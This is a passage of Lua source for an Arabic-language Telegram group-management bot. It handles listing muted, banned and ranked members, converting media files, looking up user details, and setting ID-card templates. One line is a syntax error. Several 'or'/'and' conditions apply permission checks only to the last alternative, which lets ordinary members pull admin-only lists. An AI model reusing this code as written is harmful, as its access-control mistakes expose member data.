moall = moall.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, moall, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("الاعضاء المميزين") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."bot:vipmem:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد اعضاء مميزين ", "md")
end
vip = "↫ قائمه الاعضاء المميزين \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
vip = vip.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, vip, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("الحمير") and faeder11(msg) then 
local list = faederdx1:smembers(FAEDER.."bot:donky:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد حمير ", "md")
end
donky = "↫ قائمه الحمير \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
donky = donky.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, donky, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("المميزين عام") or text == ("الاعضاء المميزين عام") and is_admin(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER..'bot:vpall:')
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد مميزين عام ", "md")
end
vpall = "↫ قائمه المميزين عام \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
vpall = vpall.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, vpall, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("المكتومين") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."bot:muted:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد مكتومين ", "md")
end
muted = "↫ قائمه المكتومين \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
muted = muted.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, muted, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("المدراء") and is_monsh2(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."bot:owners:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد مدراء ", "md")
end
owners = "↫ قائمه المدراء \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
owners = owners.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, owners, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("المدراء العامين") and is_admin(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER..'bot:onall:')
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد مدراء عامين ", "md")
end
onall = "↫ قائمه المدراء العامين \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
onall = onall.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, onall, "md")
end end,nil) end end
--     By Developer Faeder     --
if text == ("المنشئ") or text == ("المنشئين الاساسيين") or text == ("المنشئ الاساسي") and is_vpall(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."bot:monsh:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد منشئين اساسيين ", "md")
end
monsh = "↫ قائمه المنشئين الاساسيين \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
monsh = monsh.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, monsh, "md")
end end,nil) end end
--     By Developer Faeder     --
if text == ("المحظورين") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER.."bot:banned:"..msg.chat_id_)
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد محظورين ", "md")
end
ban = "↫ قائمه المحظورين \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
ban = ban.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, ban, "md")
end end,nil) end end
--     By Developer Faeder     --
if text == ("قائمه العام") and is_admin(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER..'bot:gban:')
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد محظورين عام ", "md")
end
gban = "↫ قائمه الحظر العام \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
gban = gban.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, gban, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text == ("المطورين") or text == ("مطورين الرتبه الثالثه") and is_admin(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER..'bot:admins:')
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد مطورين بهذا الرتبه ", "md")
end
dev3 = "↫ قائمه مطورين الرتبه الثالثه \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
dev3 = dev3.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, dev3, "md")
end end,nil) end end
--     By Developer Faeder     -- 
if text:match("^قائمه المنع$") then
local hash = (FAEDER..'bot:filters:'..msg.chat_id_)
if hash then
local names = faederdx1:hkeys(hash)
text = "↫ قائمه الكلمات الممنوعه \n         ───────────────\n"
for i=1, #names do
text = text..'← '..names[i]..'\n'
end
if #names == 0 then
text = "↫ لا يوجد كلمات ممنوعه " 
end
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end end
--     By Developer Faeder     -- 
if text:match("^قائمه المنع العام$") then
local hash = (FAEDER..'bot:freewords:')
if hash then
local names = faederdx1:hkeys(hash) 
text "↫ قائمه الكلمات الممنوعه عام \n         ───────────────\n"
for i=1, #names do
text = text..' ← '..names[i]..'\n'
end
if #names == 0 then
text = "↫ لا يوجد كلمات ممنوعه عام " 
end
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end end
 --     By Developer Faeder     --
 if text == ("المكتومين عام") and is_admin(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local list = faederdx1:smembers(FAEDER..'bot:mutedall:')
if #list == 0 then
return faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يوجد مكتومين عام ", "md")
end
mutedall = "↫ قائمه الكتم عام \n         ───────────────\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
mutedall = mutedall.."*"..k.."- ←* { "..username.." }\n"
if #list == k then
return faederdx(msg.chat_id_, msg.id_, 1, mutedall, "md")
end end,nil) end end end 
--     By Developer Faeder     --
if text:match("^ضع دعم$") and faeder11(msg) and is_sudo(msg) then
faederdx(msg.chat_id_, msg.id_, 1, "️↫ ارسل لي رابط قروب الدعم \n↫ او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله ", 1, "md")
faederdx1:setex(FAEDER.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if is_sudo(msg) and (text:match("^حذف الدعم$")) then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حذف معلومات الدعم ", 1, "md")
faederdx1:del(FAEDER.."bot:supports:link")
end
--     By Developer Faeder     -- 
if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..' \n↫ تم تفعيل تحويل الصيغ'
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
faederdx1:del(FAEDER..'bot:Convert'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then  
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..' \n↫ تم تعطيل تحويل الصيغ'
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
faederdx1:set(FAEDER..'bot:Convert'..msg.chat_id_,true)  
end
if text == 'تحويل' and not faederdx1:get(FAEDER..'bot:Convert'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function Convert(extra, result, success)
if result.content_.photo_ then 
local faeder = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..faeder.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local faeder = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..faeder.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','↫ تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local faeder = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..faeder.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"↫ تم تحويل الـMp3 الى بصمه")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local faeder = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..faeder.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),Convert) 
end
end 
--     By Developer Faeder     -- 
if text ==("كشف") or text ==("ايدي")  and msg.reply_to_message_id_ ~= 0 and faeder11(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = result.sender_user_id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n↫ عدد صوره ← { '..pho.total_count_..' }'
end
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n↫ عدد صوره ← { '..pho.total_count_..' }'
end
if faederdx1:sismember(FAEDER..'bot:gban:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif faederdx1:sismember(FAEDER..'bot:mutedall:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif faederdx1:sismember(FAEDER..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif faederdx1:sismember(FAEDER..'tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'مطرود'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then 
faederdx(msg.chat_id_, msg.id_, 1,'*↫ الحساب محذوف*\n', 1, 'md')
return false  end
if data.username_ == false then
text = '↫ ايديه ←{ `'..result.sender_user_id_..
'` }\n↫ رتبته بلقروب ← { '..Renk..
' }\n↫ رتبته بالبوت ← { '..faeder_renk(result.sender_user_id_, msg.chat_id_)..
' }\n'..photouser1..
'\n↫ نوع القيود ← { '..Tkeed..
' }\n↫ التواجد ← { '..tt..
' }\n↫ نوع حسابه ← { '..noh..' }'
monsend(msg,msg.chat_id_,text,data.id_) 
else
text = '↫ ايديه ←{ `'..result.sender_user_id_..
'` }\n↫ معرفه ← { [@'..data.username_..']'..
' } \n↫ رتبته بلقروب ← { '..Renk..
' }\n↫ رتبته بالبوت ← { '..faeder_renk(result.sender_user_id_, msg.chat_id_)..
' }'..photouser1..
'\n↫ نوع القيود ← { '..Tkeed..
' }\n↫ التواجد ← { '..tt..
' }\n↫ نوع حسابه ← { '..noh..' }'
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end end,nil) end,nil) end,nil) end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
--     By Developer Faeder     -- 
if text and text:match('^ايدي @(.*)') and faeder11(msg) then 
local username = text:match('^ايدي @(.*)') 
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
local text = '*↫ المعرف غير صحيح*'
faederdx(msg.chat_id_, msg.id_, 1,text, 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '*↫ نوع الحساب ← { '..ch..' }\n↫ الايدي ← {*`'..res.id_..'`*}\n↫ المعرف ← {* [@'..username..'] *}\n↫ الاسم ← { *`'..res.title_..'`* }*'
faederdx(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '↫ نوع الحساب ← { '..gr..' }\n↫ الايدي ← {*`'..res.id_..'`*}\n↫ المعرف ← {* [@'..username..'] *}\n↫ الاسم ← { *`'..res.title_..'`* }*'
faederdx(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = res.id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = res.id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n↫ عدد صوره ← { '..pho.total_count_..' }'
end
if faederdx1:sismember(FAEDER..'bot:gban:',res.id_) then
Tkeed = 'محظور عام'
elseif faederdx1:sismember(FAEDER..'bot:mutedall:',res.id_) then
Tkeed = 'مكتوم عام'
elseif faederdx1:sismember(FAEDER..'bot:banned:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif faederdx1:sismember(FAEDER..'tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then
faederdx(msg.chat_id_, msg.id_, 1,'*↫ الحساب محذوف*\n', 1, 'md')
return false  end
text = '↫ ايديه ←{ `'..res.id_..
'` }\n↫ معرفه ← { [@'..data.username_..']'..
' } \n↫ رتبته بلقروب ← { '..Renk..
' }\n↫ رتبته بالبوت ← { '..faeder_renk(res.id_, msg.chat_id_)..
' }'..photouser1..
'\n↫ نوع القيود ← { '..Tkeed..
' }\n↫ التواجد ← { '..tt..
' }\n↫ نوع حسابه ← { '..noh..' }'
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end,nil) end,nil) end,nil) end end,nil)
return false 
end
--     By Developer Faeder     -- 
if text and text:match('ايدي (%d+)') and faeder11(msg) then 
local iduser = text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = iduser},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = iduser,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
faederdx(msg.chat_id_, msg.id_, 1,'*↫ لا يمكنني اتمام الامر *\n', 1, 'md')
return false  end
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n↫ عدد صوره ← { '..pho.total_count_..' }'
end
if pho.total_count_ == 0 then 
photouser1 = ''
else
photouser1 = '\n↫ عدد صوره ← { '..pho.total_count_..' }'
end
if faederdx1:sismember(FAEDER..'bot:gban:',iduser) then
Tkeed = 'محظور عام'
elseif faederdx1:sismember(FAEDER..'bot:mutedall:',iduser) then
Tkeed = 'مكتوم عام'
elseif faederdx1:sismember(FAEDER..'bot:banned:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif faederdx1:sismember(FAEDER..'bot:muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif faederdx1:sismember(FAEDER..'tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then
faederdx(msg.chat_id_, msg.id_, 1,'*↫ الحساب محذوف *\n', 1, 'md')
return false  end
if data.username_ == false then
text = '↫ ايديه ←{ `'..iduser..
'` }\n↫ رتبته بلقروب ← { '..Renk..
' }\n↫ رتبته بالبوت ← { '..faeder_renk(iduser, msg.chat_id_)..
' }\n'..photouser1..
'\n↫ نوع القيود ← { '..Tkeed..
' }\n↫ التواجد ← { '..tt..
' }\n↫ نوع حسابه ← { '..noh..' }'
monsend(msg,msg.chat_id_,text,iduser) 
else
text = '↫ ايديه ←{ `'..iduser..
'` }\n↫ معرفه ← { [@'..data.username_..']'..
' }\n↫ رتبته بلقروب ← { '..Renk..
' }\n↫ رتبته بالبوت ← { '..faeder_renk(iduser, msg.chat_id_)..
' }'..photouser1..
'\n↫ نوع القيود ← { '..Tkeed..
' }\n↫ التواجد ← { '..tt..
' }\n↫ نوع حسابه ← { '..noh..' }'
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end end,nil) end,nil) end,nil)
return false 
end
--     By Developer Faeder     -- 
local text = msg.content_.text_:gsub('اضافه','Invite')
if text:match("^[Ii]nvite$") and msg.reply_to_message_id_ ~= 0 then
function inv_reply(extra, result, success)
add_user(result.chat_id_, result.sender_user_id_, 5)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
end 
--     By Developer Faeder     -- 
if text:match("^[Ii]nvite @(.*)$") then
local ap = {string.match(text, "^([Ii]nvite) @(.*)$")}
function invite_by_username(extra, result, success)
if result.id_ then
add_user(msg.chat_id_, result.id_, 5)
else
if faederdx1:get(FAEDER..'lang:gp:'..msg.chat_id_) then
texts = '↫ User not found '
else
texts = '↫ المعرف غير صحيح '
end
faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end end
resolve_username(ap[2],invite_by_username)
end end
--     By Developer Faeder     --
if text == "رابط القروب" then
  
  tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
  local status_Link = faederdx1:get(FAEDER.."Eqap:Link_Group"..msg.chat_id_)
  local link = redis:get(FAEDER.."Eqap:link:set:Group"..msg.chat_id_)     
         
  if link then                              
  send1(msg.chat_id_,msg.id_,"["..ta.title_.."]("..link..")")                          
  else                
  local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
  if linkgpp.ok == true then 
  send1(msg.chat_id_,msg.id_,"["..ta.title_.."]("..linkgpp.result..")")                          
  else
  send(msg.chat_id_, msg.id_,"• لا يوجد رابط للمجموعه")              
  end            
  end
  end,nil)
  return false 
  end 
--------------------------------
if text and text:match("^[Ii]nvite (%d+)$") then 
local ap = {string.match(text, "^([Ii]nvite) (%d+)$")}
add_user(msg.chat_id_, ap[2], 5)
end 
--     By Developer Faeder     -- 
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تغيير الايدي$") and faeder11(msg) or text and text:match("^تغير الايدي$") and faeder11(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
★ 𝑰𝑫 #id .
★ 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 #username .
★ 𝑹𝒂𝒏𝒌 #stast .
★ 𝑴𝒔𝒈 #msgs
]],
[[
✩ الاســم ➪ #name .
✩  ايديك ➪ #id .
✩ معرفك ➪ #username .
✩ رتبتك ➪ #stast .
✩  رسائلك ➪ #msgs .
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼 𝒊𝒅 : #id 
𓄼 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
⚥ الاســم 𓃗 #name
⚥  ايديك 𓃗 #id
⚥ معرفك 𓃗 #username
⚥ رتبتك 𓃗 #stast
⚥  رسائلك 𓃗 #msgs
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
↫ 𝐔𝐒𝐄𝐑 ↬ #username 
↫ 𝐈𝐃 ↬ #id
↫ 𝐒𝐓𝐀𝐒𝐓 ↬ #stast
↫ 𝐀𝐔𝐓𝐎 ↬ #cont 
↫ 𝐌𝐀𝐒𝐆 ↬ #msgs
↫ 𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇸🇦
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇸🇦
ᯓ 𝗜𝗗 . #id 🇸🇦
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇸🇦
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇸🇦
]]}
local Text_Rand = List[math.random(#List)]
faederdx1:set("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_,Text_Rand)
local faeder = '↫ اهلا عزيزي  '..renk_faeder(msg)..' \n↫ تم تغيير كليشة الايدي \n↫ ارسل الامر مره اخرى للتغيير مجددا '
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
--     By Developer Faeder     -- 
if is_leader(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") and faeder11(msg) or text and text:match("^تعيين ايدي عام$") and faeder11(msg) or text and text:match("^تعيين الايدي عام$") and faeder11(msg) then   
faederdx(msg.chat_id_, msg.id_, 1, ' \n↫ لتعيين كليشه الايدي استخدم الدوال ادناه \n         ───────────────\n- #username  لطبع المعرف\n- #id  لطبع الايدي \n- #photos  لطبع عدد الصور \n- #stast لطبع الرتبه \n- #msgs  لطبع عدد الرسائل \n- #msgday  لطبع الرسائل اليوميه \n- #formsg  لطبع التفاعل \n- #game  لطبع عدد النقاط \n- #cont  لطبع عدد الجهات \n- #sticker  لطبع عدد الملصقات\n', 1, 'md')
faederdx1:set("FAEDER:New:id:"..bot_id..msg.sender_user_id_,'faeder')
return "faeder"
end
if text and faederdx1:get("FAEDER:New:id:"..bot_id..msg.sender_user_id_) then 
if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء حفظ كليشة الايدي ', 1, 'md')
faederdx1:del("FAEDER:New:id:"..bot_id..msg.sender_user_id_)
return false
end
faederdx1:del("FAEDER:New:id:"..bot_id..msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حفظ كليشة الايدي العامه ', 1, 'md')
faederdx1:set("FAEDER:faeder:id:text:"..bot_id,text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
local faeder = '↫ اهلا عزيزي  '..renk_faeder(msg)..' \n↫ تم حذف كليشة الايدي العامه '
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
faederdx1:del("FAEDER:faeder:id:text:"..bot_id)
end end
--     By Developer Faeder     -- 
if text and text:match("^تعيين الايدي$") and faeder11(msg) or text and text:match("^تعين الايدي$") and faeder11(msg) then
faederdx(msg.chat_id_, msg.id_, 1, ' \n↫ لتعيين كليشه الايدي استخدم الدوال ادناه \n         ───────────────\n- #username  لطبع المعرف\n- #id  لطبع الايدي \n- #photos  لطبع عدد الصور \n- #stast لطبع الرتبه \n- #msgs  لطبع عدد الرسائل \n- #msgday  لطبع الرسائل اليوميه \n- #formsg  لطبع التفاعل \n- #game  لطبع عدد النقاط \n- #cont  لطبع عدد الجهات \n- #sticker  لطبع عدد الملصقات\n', 1, 'md')
faederdx1:set("FAEDER:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'faeder')
return "faeder"
end
if text and is_owner(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("FAEDER:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
